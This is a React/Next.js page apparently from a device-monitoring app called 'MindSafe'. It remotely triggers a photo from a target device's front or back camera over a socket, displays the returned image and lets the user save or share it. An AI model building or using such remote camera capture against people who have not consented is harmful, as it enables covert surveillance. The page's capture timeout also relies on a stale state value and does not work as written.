'use client';

import { useState, useEffect } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { useGlobalContext } from '@/context/GlobalProvider';
import { consumeTrialAccess } from '@/lib/appwrite';
import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket } from '@/lib/socket';
import { Camera as CameraIcon, ArrowLeft, Download, Share2, CheckCircle } from 'lucide-react';

export default function CameraPage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showInfo, showWarning, showPremium } = useNotification();
    const { user } = useGlobalContext();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [selectedCamera, setSelectedCamera] = useState<0 | 1>(0); // 0 = back, 1 = front
    const [isCapturing, setIsCapturing] = useState(false);
    const [capturedImage, setCapturedImage] = useState<string | null>(null);
    const [isSaved, setIsSaved] = useState(false);
    const [trialConsumed, setTrialConsumed] = useState(false);

    const ensureTrialOnFirstUse = async () => {
        if (trialConsumed) return true;
        if (!user?.$id || !deviceId) {
            showWarning('Trial Unavailable', 'Missing device or user details.');
            return false;
        }

        const trial = await consumeTrialAccess(user.$id, deviceId, 'camera');
        if (!trial.allowed) {
            showWarning('Trial Limit Reached', trial.message);
            showPremium('Premium Feature', 'Camera trial limit reached. Upgrade to continue.', () => router.push('/premium'));
            return false;
        }

        setTrialConsumed(true);
        showInfo('Trial Access Used', `${trial.usedCount}/${trial.maxUses} used for Camera this month.`);
        return true;
    };
    useEffect(() => {
        // Initialize socket connection
        initSocket(deviceId);

        // Set up result listener
        onResult((data) => {
            if (data.image && data.base64) {
                setCapturedImage(data.base64);
                setIsCapturing(false);
                setIsSaved(false);
                showSuccess('Image Captured', 'Photo received successfully!');
            }
        });

        return () => {
            disconnectSocket();
        };
    }, [deviceId]);

    const handleCapture = async () => {
        const canUse = await ensureTrialOnFirstUse();
        if (!canUse) return;
        setIsCapturing(true);
        showInfo('Capturing...', 'Please wait while we capture the photo');

        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.CAMERA, extra: selectedCamera },
        });

        // Timeout after 30 seconds
        setTimeout(() => {
            if (isCapturing) {
                setIsCapturing(false);
                showError('Timeout', 'Failed to capture image. Please try again.');
            }
        }, 30000);
    };

    const handleSave = () => {
        if (!capturedImage) return;

        // Create download link
        const link = document.createElement('a');
        link.href = capturedImage;
        link.download = `MindSafe_${deviceName}_${Date.now()}.jpg`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        setIsSaved(true);
        showSuccess('Image Saved', 'Photo has been downloaded');
    };

    const handleShare = async () => {
        if (!capturedImage) return;

        try {
            if (navigator.share) {
                const blob = await fetch(capturedImage).then(r => r.blob());
                const file = new File([blob], `MindSafe_${deviceName}.jpg`, { type: 'image/jpeg' });
                await navigator.share({ files: [file] });
            } else {
                await navigator.clipboard.writeText(capturedImage);
                showInfo('Copied', 'Image URL copied to clipboard');
            }
        } catch (error) {
            console.error('Share error:', error);
        }
    };

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button
                                onClick={() => router.back()}
                                className="p-2 rounded-xl bg-orange-500/15"
                            >
                                <ArrowLeft className="w-5 h-5 text-orange-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">Camera Control</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <div className="w-14 h-14 rounded-full bg-white/10 flex items-center justify-center">
                            <CameraIcon className="w-7 h-7 text-white" />
                        </div>
                    </div>
                </div>
            </div>

            {/* Camera Selection */}
            <div className="ms-card p-5 mb-6">
                <h3 className="text-white font-semibold text-center mb-4">Select Camera View</h3>
                <div className="grid grid-cols-2 gap-3">
                    <button
                        onClick={() => setSelectedCamera(0)}
                        className={`p-4 rounded-xl flex items-center justify-center gap-3 transition-all ${selectedCamera === 0
                            ? 'gradient-primary text-white shadow-lg shadow-orange-500/20'
                            : 'bg-gray-700/30 border border-gray-600/30 text-gray-400'
                            }`}
                    >
                        <CameraIcon className="w-5 h-5" />
                        <span className="font-medium">Back Camera</span>
                    </button>
                    <button
                        onClick={() => setSelectedCamera(1)}
                        className={`p-4 rounded-xl flex items-center justify-center gap-3 transition-all ${selectedCamera === 1
                            ? 'gradient-primary text-white shadow-lg shadow-orange-500/20'
                            : 'bg-gray-700/30 border border-gray-600/30 text-gray-400'
                            }`}
                    >
                        <CameraIcon className="w-5 h-5" />
                        <span className="font-medium">Front Camera</span>
                    </button>
                </div>
            </div>

            {/* Capture Button */}
            <button
                onClick={handleCapture}
                disabled={isCapturing}
                className={`w-full py-4 rounded-xl font-bold text-lg flex items-center justify-center gap-3 mb-6 transition-all ${isCapturing
                    ? 'bg-gray-600 text-gray-300 cursor-not-allowed'
                    : 'gradient-primary text-white hover:opacity-90'
                    }`}
            >
                {isCapturing ? (
                    <>
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Capturing...
                    </>
                ) : (
                    <>
                        <CameraIcon className="w-5 h-5" />
                        Capture Photo
                    </>
                )}
            </button>

            {/* Captured Image Display */}
            {capturedImage && (
                <div className="animate-slide-up">
                    <h3 className="text-lg font-bold text-white mb-4">Captured Photo</h3>

                    <div className="ms-card p-4 mb-4">
                        <img
                            src={capturedImage}
                            alt="Captured"
                            className="w-full rounded-xl object-contain max-h-[400px]"
                        />
                    </div>

                    {/* Action Buttons */}
                    <div className="grid grid-cols-2 gap-3">
                        <button
                            onClick={handleSave}
                            className={`py-4 rounded-xl font-semibold flex items-center justify-center gap-2 transition-all ${isSaved
                                ? 'bg-emerald-500 text-white'
                                : 'bg-orange-500 hover:bg-orange-600 text-white'
                                }`}
                        >
                            {isSaved ? (
                                <>
                                    <CheckCircle className="w-5 h-5" />
                                    Saved!
                                </>
                            ) : (
                                <>
                                    <Download className="w-5 h-5" />
                                    Save
                                </>
                            )}
                        </button>
                        <button
                            onClick={handleShare}
                            className="py-4 rounded-xl font-semibold flex items-center justify-center gap-2 bg-blue-500 hover:bg-blue-600 text-white transition-all"
                        >
                            <Share2 className="w-5 h-5" />
                            Share
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}


